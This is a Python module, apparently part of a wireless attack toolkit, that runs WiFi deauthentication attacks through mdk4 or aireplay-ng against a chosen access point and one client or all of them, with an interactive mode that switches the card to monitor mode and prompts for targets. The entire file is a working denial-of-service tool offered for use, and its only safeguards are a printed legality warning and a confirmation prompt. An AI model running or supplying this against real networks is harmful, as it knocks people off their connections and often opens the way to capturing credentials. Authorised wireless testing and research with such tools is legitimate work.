#!/usr/bin/env python3
"""WiFi Deauthentication Attack"""

import subprocess
import signal
import sys
from ..utils.colors import Colors
from ..utils.interfaces import get_wifi_interfaces, select_interface, enable_monitor_mode, disable_monitor_mode
from ..utils.logger import Logger


def attack(interface=None, target=None, ap=None, count=0):
    """
    Launch deauth attack using mdk4 or aireplay-ng
    
    Args:
        interface: WiFi interface (must be in monitor mode)
        target: Target client MAC (optional, broadcast if not specified)
        ap: Access point BSSID
        count: Number of deauth packets (0 = continuous)
    """
    if not interface or not ap:
        print(Colors.error("Interface and AP BSSID required"))
        return False
    
    print(Colors.warning("⚠️  Deauthentication attacks may be illegal without authorization!"))
    print(Colors.info(f"Target AP: {ap}"))
    if target:
        print(Colors.info(f"Target client: {target}"))
    else:
        print(Colors.info("Target: Broadcast (all clients)"))
    
    # Try mdk4 first (more reliable)
    try:
        cmd = ['mdk4', interface, 'd', '-B', ap]
        if target:
            cmd.extend(['-S', target])
        
        print(Colors.info("Starting deauth attack with mdk4 (Ctrl+C to stop)..."))
        process = subprocess.Popen(cmd)
        process.wait()
        
    except FileNotFoundError:
        # Fall back to aireplay-ng
        try:
            cmd = ['aireplay-ng', '--deauth', str(count) if count else '0', '-a', ap]
            if target:
                cmd.extend(['-c', target])
            cmd.append(interface)
            
            print(Colors.info("Starting deauth attack with aireplay-ng (Ctrl+C to stop)..."))
            process = subprocess.Popen(cmd)
            process.wait()
            
        except FileNotFoundError:
            print(Colors.error("Neither mdk4 nor aireplay-ng found!"))
            return False
    except KeyboardInterrupt:
        print(Colors.warning("\nAttack stopped"))
    
    return True


def interactive():
    """Interactive deauth attack"""
    logger = Logger("deauth")
    
    interfaces = get_wifi_interfaces()
    interface = select_interface(interfaces, "WiFi")
    
    if not interface:
        return
    
    # Enable monitor mode
    print(Colors.info("Monitor mode required for deauth attacks"))
    if not enable_monitor_mode(interface):
        print(Colors.error("Failed to enable monitor mode"))
        return
    
    try:
        # Get target AP
        ap = input(Colors.prompt("Target AP BSSID: ")).strip()
        if not ap:
            print(Colors.error("AP BSSID required"))
            return
        
        # Optional client target
        target = input(Colors.prompt("Target client MAC (Enter for broadcast): ")).strip()
        
        logger.info(f"Deauth attack on AP: {ap}, Client: {target or 'broadcast'}")
        
        # Confirm
        confirm = input(Colors.prompt("Start attack? [y/N]: ")).strip().lower()
        if confirm != 'y':
            print(Colors.warning("Attack cancelled"))
            return
        
        attack(interface, target if target else None, ap)
        
    except KeyboardInterrupt:
        print(Colors.warning("\nCancelled"))
    finally:
        # Restore managed mode
        disable_monitor_mode(interface)
